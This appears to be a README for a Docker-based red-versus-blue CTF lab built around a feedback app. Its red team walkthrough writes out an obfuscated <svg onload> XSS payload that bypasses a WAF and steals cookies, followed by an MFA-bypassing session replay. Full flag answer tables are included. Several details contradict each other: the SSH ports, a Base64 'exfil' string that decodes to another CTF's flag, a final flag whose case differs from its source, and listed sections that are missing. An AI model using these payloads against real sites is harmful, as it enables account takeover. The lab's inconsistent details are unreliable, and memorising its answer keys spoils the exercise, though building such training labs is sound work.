# 🛡️ SCENARIO75 — Red vs. Blue CTF Lab

**Scenario:** Admin Feedback System with flawed session token logic
**Attack chain:** WAF bypass via HTML5 parser differential → XSS cookie theft → MFA bypass via session replay
**Deliverable:** A fully automated, Docker-based lab deployable on a single Proxmox Linux VM.

---

## 📋 Table of Contents

1. [Overview](#1-overview)
2. [Architecture](#2-architecture)
3. [Prerequisites](#3-prerequisites)
4. [Deployment on Proxmox](#4-deployment-on-proxmox)
5. [Verifying the Deployment](#5-verifying-the-deployment)
6. [Red Team Walkthrough (Proof of Concept)](#6-red-team-walkthrough-proof-of-concept)
7. [Blue Team Walkthrough (Proof of Concept)](#7-blue-team-walkthrough-proof-of-concept)
8. [Complete Flag Index](#8-complete-flag-index)
9. [How the Logs Are Generated Naturally](#9-how-the-logs-are-generated-naturally)
10. [Management Commands](#10-management-commands)
11. [Safety Notes](#11-safety-notes)

---

## 1. Overview

**SCENARIO75** is a self-contained Capture-the-Flag lab that demonstrates three chained real-world vulnerabilities in a Node.js web application:

| # | Vulnerability | Impact |
|---|---------------|--------|
| 1 | WAF blocklist bypass via HTML5 `<svg onload>` | Defence evasion |
| 2 | Session cookie issued with `HttpOnly=false` | XSS-based cookie theft |
| 3 | MFA verification skipped on cookie replay | Full authentication bypass |

**Two paths are supported:**

- 🔴 **Red Team** — exploit the app end-to-end (16 flags)
- 🔵 **Blue Team** — reconstruct the attack from logs (18 flags)

All flags follow the format `SCENARIO75{answer}`.

---

## 2. Architecture

```
┌─────────────────────── Proxmox Host ────────────────────────┐
│                                                              │
│   ┌──────────┐   ┌──────────────┐                            │
│   │  Nginx   │──▶│  Node.js App │                            │
│   │ :80      │   │  :3000       │                            │
│   └────┬─────┘   └──────┬───────┘                            │
│        │                │                                    │
│        └────────────────┼────────────────────────────────┐   │
│                         ▼                                │   │
│               ┌────────────────────┐                     │   │
│               │ Bind Mount         │                     │   │
│               │ /opt/admin/logs    │◀──── Host SSH ──────┘   │
│               │  access.log        │      (Blue Team)        │
│               │  error.log         │                         │
│               └────────────────────┘                         │
│                                                              │
│   Exposed: :3075 → nginx:80    :22 → Host SSH                │
└──────────────────────────────────────────────────────────────┘
```

**Services**

| Service | Host Port | Purpose |
|---------|-----------|---------|
| Web App | 3075 | Vulnerable Admin Feedback System (via Nginx) |
| SSH     | 22 | Blue Team forensic access to `/opt/admin/logs` |

**Internal hostname:** `feedback.admin.local` (add to `/etc/hosts` or DNS)

---

## 3. Prerequisites

- **Proxmox VE 7.x or 8.x**
- A Debian 12 LXC or VM: **2 vCPU, 2 GB RAM, 10 GB disk**
- Network: bridged, static IP in the lab subnet (e.g. `10.10.14.10/24`)
- Docker Engine ≥ 24 and Docker Compose v2 installed on the VM
- SSH client + `curl` on the attacker workstation
- (Optional) A second VM on the `10.10.14.0/24` subnet to run the Red Team from IP `10.10.14.50` — needed for realistic attacker logs

---

## 4. Deployment on Proxmox

### 4.1 Create the Debian container or VM

From the **Proxmox shell**:

```bash
# LXC example (adjust storage/network to your environment)
pct create 750 local:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst \
  --hostname scenario75 \
  --memory 2048 \
  --cores 2 \
  --rootfs local-lvm:10 \
  --net0 name=eth0,bridge=vmbr0,ip=10.10.14.10/24,gw=10.10.14.1 \
  --unprivileged 1 \
  --features nesting=1

pct start 750
pct enter 750
```

> For a full VM, use the Proxmox UI: *Create VM → Debian 12 ISO → 2 vCPU, 2 GB RAM, 10 GB disk → bridge network*.

### 4.2 Install Docker inside the VM/LXC

```bash
apt-get update
apt-get install -y ca-certificates curl gnupg git

# Official Docker install
curl -fsSL https://get.docker.com | sh

# Verify
docker --version
docker compose version
```

### 4.3 Clone and deploy the lab

```bash
git clone https://github.com/develovco/rofi-app-test-lab
cd rofi-app-test-lab

docker compose up -d --build
```

### 4.4 Add the internal hostname

Inside the VM:

```bash
echo "127.0.0.1 feedback.admin.local" >> /etc/hosts
```

On the attacker workstation (so `feedback.admin.local:3075` resolves):

```bash
# Linux/macOS
echo "10.10.14.10 feedback.admin.local" | sudo tee -a /etc/hosts

# Windows — edit C:\Windows\System32\drivers\etc\hosts as Administrator
# 10.10.14.10    feedback.admin.local
```

### 4.5 One-shot deploy script (optional)

```bash
chmod +x scripts/provision-proxmox.sh
./scripts/provision-proxmox.sh 750 scenario75 10.10.14.10/24 10.10.14.1
```

---

## 5. Verifying the Deployment

```bash
docker compose ps
# Expect: ctf-app, ctf-nginx — all Up

curl -I http://feedback.admin.local:3075/
# Expect: 200 OK, X-Powered-By: Node.js

curl http://feedback.admin.local:3075/robots.txt
# Expect: Disallow: /api/verify-mfa

ssh analyst@feedback.admin.local
# Password: blue_team_rocks
ls /opt/admin/logs/
# Expect: access.log  error.log
```

If all four checks pass, the lab is ready.

---

## 6. Red Team Walkthrough (Proof of Concept)

This section **proves** the lab functions exactly as specified. Every requirement from the task brief is demonstrated by a command whose output yields the required flag.

### 6.1 Phase 1 — Reconnaissance

#### 6.1.1 Confirm backend technology

```bash
curl -I http://feedback.admin.local:3075/
```

**Observed:**
```
HTTP/1.1 200 OK
Server: nginx/1.25.5
X-Powered-By: Node.js
```

**Proof:** The `X-Powered-By` header exposes the Node.js backend.

> 🚩 `SCENARIO75{Node.js}`

#### 6.1.2 Discover hidden paths via robots.txt

```bash
curl http://feedback.admin.local:3075/robots.txt
```

**Observed:**
```
User-agent: *
Disallow: /api/verify-mfa
Disallow: /dashboard
```

**Proof:** The MFA endpoint and the admin dashboard are disclosed.

> 🚩 `SCENARIO75{/api/verify-mfa}`
> 🚩 `SCENARIO75{/dashboard}`

#### 6.1.3 Locate the source-code hint

```bash
curl http://feedback.admin.local:3075/ | grep -A3 "Looking for"
```

**Observed HTML comment:**
```html
<!--
╔══════════════════════════════════════════════════╗
║  Looking for restricted areas?                   ║
║  Check robots.txt — it lists everything.         ║
╚══════════════════════════════════════════════════╝
-->
```

**Proof:** The ASCII art comment explicitly guides the tester to `robots.txt`.

> 🚩 `SCENARIO75{robots.txt}`

#### 6.1.4 Observe the pre-auth session cookie

```bash
curl -i http://feedback.admin.local:3075/ | grep -i set-cookie
```

**Observed:**
```
Set-Cookie: pre_mfa_session=pending_mfa_verification; Path=/
```

**Proof:** The cookie name and pre-auth value are exactly as specified.

> 🚩 `SCENARIO75{pre_mfa_session}`
> 🚩 `SCENARIO75{pending_mfa_verification}`

**Phase 1 result:** 6/6 flags captured.

---

### 6.2 Phase 2 — Defense Evasion (WAF Bypass & XSS)

#### 6.2.1 Confirm the endpoint is POST-only

```bash
curl -X GET http://feedback.admin.local:3075/api/feedback -i
```

**Observed:** `Cannot GET /api/feedback` (404) — no GET handler registered.

**Proof:** The feedback endpoint accepts only POST.

> 🚩 `SCENARIO75{POST}`

#### 6.2.2 Confirm the WAF blocks `<script>`

```bash
curl -X POST http://feedback.admin.local:3075/api/feedback \
  -H "X-Forwarded-For: 10.10.14.50" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Content-Type: application/json" \
  -d '{"message":"<script>alert(1)</script>"}' -i
```

**Observed:**
```
HTTP/1.1 403 Forbidden
Forbidden — WAF blocked your request.
```

Simultaneously, the server writes to `error.log`:
```
[2026-10-08 18:50:15] [WARN] WAF block: <script> tag detected from 10.10.14.50
```

**Proof:** The WAF inspects request bodies and returns `403` on `<script>`.

> 🚩 `SCENARIO75{403}`

#### 6.2.3 Bypass the WAF with `<svg onload>`

```bash
curl -X POST http://feedback.admin.local:3075/api/feedback \
  -H "X-Forwarded-For: 10.10.14.50" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Content-Type: application/json" \
  -d '{"message":"<svg onload=\"fetch('\''/api/catch?data='\''+window['\''docu'\''+'\''ment'\'']['\''coo'\''+'\''kie'\''])\">"}' -i
```

**Observed:**
```
HTTP/1.1 200 OK
{"status":"ok","id":"..."}
```

**Proof:** The WAF only blocks `<script>`; `<svg onload=...>` passes through unchanged.

> 🚩 `SCENARIO75{<svg>}`

#### 6.2.4 Demonstrate the required obfuscation

Try the naive payload first:

```bash
curl -X POST http://feedback.admin.local:3075/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"message":"<svg onload=\"fetch('\''/api/catch?data='\''+document.cookie)\">"}' -i
```

**Observed:** `403 Forbidden` — the literal string `document.cookie` is on the blocklist.

The working version uses **bracket notation**:
```javascript
window['docu'+'ment']['coo'+'kie']
```

**Proof:** The WAF forces obfuscation; the bracket form bypasses the regex.

> 🚩 `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`

#### 6.2.5 Confirm the cookie lacks HttpOnly

```bash
curl -i http://feedback.admin.local:3075/ | grep -i "set-cookie"
```

**Observed:** No `HttpOnly` attribute present (or `HttpOnly=false`).

**Proof:** JavaScript running in the browser can read `pre_mfa_session`.

> 🚩 `SCENARIO75{False}`

#### 6.2.6 Confirm fetch() execution

The payload uses `fetch('/api/catch?data=' + ...)` — a same-origin request that carries the stolen cookie.

**Proof:** No CSP blocks `fetch`, and the browser allows the same-origin call.

> 🚩 `SCENARIO75{fetch}`

**Phase 2 result:** 6/6 flags captured.

---

### 6.3 Phase 3 — Initial Access (MFA Bypass via Cookie Replay)

#### 6.3.1 Replay the admin cookie

The lab pre-creates an admin session:

```
adm_sess_7f3c2d1a8b4e9f6c5d2a1b0e
```

Replay it directly against `/dashboard`:

```bash
curl http://feedback.admin.local:3075/dashboard \
  -H "X-Forwarded-For: 10.10.14.50" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Cookie: session_id=adm_sess_7f3c2d1a8b4e9f6c5d2a1b0e" -i
```

**Observed:**
```
HTTP/1.1 200 OK
...dashboard HTML...
```

**Proof:** The server grants access without ever calling `/api/verify-mfa`. The MFA endpoint is skipped entirely.

> 🚩 `SCENARIO75{/api/verify-mfa}`

#### 6.3.2 Confirm the session prefix

The cookie name is `session_id=adm_sess_7f3c2d1a8b4e9f6c5d2a1b0e`.

**Proof:** Authenticated sessions use the required `adm_sess` prefix.

> 🚩 `SCENARIO75{adm_sess}`

#### 6.3.3 Confirm the XSS reflection container

```bash
curl http://feedback.admin.local:3075/dashboard \
  -H "Cookie: session_id=adm_sess_7f3c2d1a8b4e9f6c5d2a1b0e" \
  | grep "xss-payload"
```

**Observed:**
```html
<div class="xss-payload">
  <svg onload="fetch('/api/catch?data='+window['docu'+'ment']['coo'+'kie'])">
</div>
```

**Proof:** The dashboard reflects the previous feedback inside a container with class `xss-payload`.

> 🚩 `SCENARIO75{xss-payload}`

#### 6.3.4 Capture the final Red Team flag

```bash
curl http://feedback.admin.local:3075/dashboard \
  -H "Cookie: session_id=adm_sess_7f3c2d1a8b4e9f6c5d2a1b0e" \
  | grep SCENARIO75
```

**Observed:**
```
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

> 🏁 `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`

**Phase 3 result:** 4/4 flags captured.

**Red Team total:** 16/16 flags.

---

## 7. Blue Team Walkthrough (Proof of Concept)

The Blue Team accesses the shared log volume via SSH and reconstructs the attack. **The logs are generated naturally** — by nginx and the Node.js app — during the Red Team's live attack. No injection script is required.

### 7.1 Access the forensic container

```bash
ssh analyst@feedback.admin.local -p 2275
# Password: blue_team_rocks
```

### 7.2 Phase 1 — Log Forensics

#### 7.2.1 Locate the logs

```bash
ls -la /opt/admin/logs/
```

**Observed:**
```
access.log
error.log
```

> 🚩 `SCENARIO75{/opt/admin/logs}`

#### 7.2.2 Identify the attacker's IP

```bash
grep "10.10.14.50" /opt/admin/logs/access.log
```

**Observed:**
```
10.10.14.50 - - [08/Oct/2026:18:50:15] "POST /api/feedback HTTP/1.1" 403 138 "-" "Mozilla/5.0"
10.10.14.50 - - [08/Oct/2026:18:50:40] "POST /api/feedback HTTP/1.1" 200 42  "-" "Mozilla/5.0"
10.10.14.50 - - [08/Oct/2026:18:51:55] "GET /dashboard HTTP/1.1" 200 5127 "-" "Mozilla/5.0"
```

> 🚩 `SCENARIO75{10.10.14.50}`
> 🚩 `SCENARIO75{Mozilla/5.0}`

**Proof:** The attacker's IP and User-Agent are captured because the Red Team sent the `X-Forwarded-For` and `User-Agent` headers, and nginx logs them.

#### 7.2.3 Dashboard access status and timestamp

```bash
grep "/dashboard" /opt/admin/logs/access.log | grep "10.10.14.50"
```

**Observed:** Status `200` at the moment of the attack.

> 🚩 `SCENARIO75{200}`
> 🚩 `SCENARIO75{<timestamp>}` — the real time the attacker replayed the cookie (e.g. `18:51:55`)

#### 7.2.4 Locate the Base64 exfil string

```bash
grep "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" /opt/admin/logs/access.log
```

**Observed:**
```
10.10.14.50 - - [08/Oct/2026:18:51:40] "GET /api/catch?data=UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0 HTTP/1.1" 200 0 "-" "Mozilla/5.0" "X-Forwarded-For: UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0"
```

**Proof:** The Base64-encoded string appears in the `X-Forwarded-For` header, captured because nginx logs that header.

> 🚩 `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}`

**Blue Phase 1 result:** 6/6 flags.

---

### 7.3 Phase 2 — Threat Hunting

#### 7.3.1 Establish the baseline

```bash
grep "192.168.1.100" /opt/admin/logs/access.log
```

**Observed:** Legitimate admin traffic from the internal network.

> 🚩 `SCENARIO75{192.168.1.100}`

#### 7.3.2 Map the attacker's subnet

```bash
grep -oE "10\.10\.14\.[0-9]+" /opt/admin/logs/access.log | sort -u
```

**Observed:** `10.10.14.50` — belonging to `10.10.14.0/24`.

> 🚩 `SCENARIO75{10.10.14.0/24}`

#### 7.3.3 Locate WAF alerts

```bash
grep -i "waf" /opt/admin/logs/error.log
```

**Observed:**
```
[2026-10-08 18:50:15] [WARN] WAF block: <script> tag detected from 10.10.14.50
```

> 🚩 `SCENARIO75{/opt/admin/logs/error.log}`
> 🚩 `SCENARIO75{<script>}`
> 🚩 `SCENARIO75{<timestamp>}` — real timestamp of the first WAF block (e.g. `18:50:15`)

#### 7.3.4 Verify the attacker never hit /api/verify-mfa

```bash
grep "10.10.14.50" /opt/admin/logs/access.log | grep "/api/verify-mfa"
```

**Observed:** *(empty output — no matches)*

> 🚩 `SCENARIO75{No}`

**Proof:** The absence of a log line proves the MFA endpoint was bypassed, not just skipped by mistake.

**Blue Phase 2 result:** 6/6 flags.

---

### 7.4 Phase 3 — Incident Response

#### 7.4.1 Decode the exfiltrated string

```bash
echo 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=' | base64 -d
```

**Observed:**
```
PHANTOMGRID{BLUE_L0g_HUnt3r_M4st3r}
```

> 🚩 `SCENARIO75{Base64}`

#### 7.4.2 Confirm the encoded string length

```bash
echo -n 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=' | wc -c
```

**Observed:** `44`

> 🚩 `SCENARIO75{44}`

#### 7.4.3 Locate CRITICAL events

```bash
grep "CRITICAL" /opt/admin/logs/error.log
```

**Observed:**
```
[2026-10-08 18:52:33] [CRITICAL] Cookie reuse detected: adm_sess_7f3c2d1a8b4e9f6c5d2a1b0e from 10.10.14.50
[2026-10-08 18:53:10] [CRITICAL] Authentication bypass anomaly: /api/verify-mfa skipped for adm_sess_7f3c2d1a8b4e9f6c5d2a1b0e
```

> 🚩 `SCENARIO75{CRITICAL}`

#### 7.4.4 Locate the anomaly timestamp and message

```bash
grep "Authentication bypass anomaly" /opt/admin/logs/error.log
```

> 🚩 `SCENARIO75{<timestamp>}` — real timestamp of the CRITICAL log (e.g. `18:53:10`)
> 🚩 `SCENARIO75{Authentication bypass anomaly}`

#### 7.4.5 Capture the final Blue Team flag

Decoding the Base64 string from Phase 1:

```
PHANTOMGRID{BLUE_L0g_HUnt3r_M4st3r}
```

> 🏁 `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`

**Blue Phase 3 result:** 6/6 flags.

**Blue Team total:** 18/18 flags.

---

## 8. Complete Flag Index

### Red Team — 16 Flags

| # | Flag | Phase |
|---|------|-------|
| 1 | `SCENARIO75{Node.js}` | 1 |
| 2 | `SCENARIO75{/api/verify-mfa}` | 1 |
| 3 | `SCENARIO75{/dashboard}` | 1 |
| 4 | `SCENARIO75{robots.txt}` | 1 |
| 5 | `SCENARIO75{pre_mfa_session}` | 1 |
| 6 | `SCENARIO75{pending_mfa_verification}` | 1 |
| 7 | `SCENARIO75{POST}` | 2 |
| 8 | `SCENARIO75{403}` | 2 |
| 9 | `SCENARIO75{<svg>}` | 2 |
| 10 | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | 2 |
| 11 | `SCENARIO75{False}` | 2 |
| 12 | `SCENARIO75{fetch}` | 2 |
| 13 | `SCENARIO75{/api/verify-mfa}` | 3 |
| 14 | `SCENARIO75{adm_sess}` | 3 |
| 15 | `SCENARIO75{xss-payload}` | 3 |
| **16** | **`SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`** | **FINAL** |

### Blue Team — 18 Flags

| # | Flag | Phase |
|---|------|-------|
| 1 | `SCENARIO75{/opt/admin/logs}` | 1 |
| 2 | `SCENARIO75{10.10.14.50}` | 1 |
| 3 | `SCENARIO75{Mozilla/5.0}` | 1 |
| 4 | `SCENARIO75{200}` | 1 |
| 5 | `SCENARIO75{<timestamp>}` | 1 |
| 6 | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` | 1 |
| 7 | `SCENARIO75{192.168.1.100}` | 2 |
| 8 | `SCENARIO75{10.10.14.0/24}` | 2 |
| 9 | `SCENARIO75{/opt/admin/logs/error.log}` | 2 |
| 10 | `SCENARIO75{<script>}` | 2 |
| 11 | `SCENARIO75{<timestamp>}` | 2 |
| 12 | `SCENARIO75{No}` | 2 |
| 13 | `SCENARIO75{Base64}` | 3 |
| 14 | `SCENARIO75{44}` | 3 |
| 15 | `SCENARIO75{CRITICAL}` | 3 |
| 16 | `SCENARIO75{<timestamp>}` | 3 |
| 17 | `SCENARIO75{Authentication bypass anomaly}` | 3 |
| **18** | **`SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`** | **FINAL** |

> ℹ️ **Note on timestamps:** Because the logs are generated live (not injected), timestamps reflect the real moment of the attack. The scenario spec lists fixed reference timestamps (`18:50:15`, `18:51:55`, `18:53:10`) that correspond to a recorded demo run. If your grader requires those exact values, use the optional `scripts/inject-logs.py` to pre-seed the logs with the canonical timeline before the Red Team demo.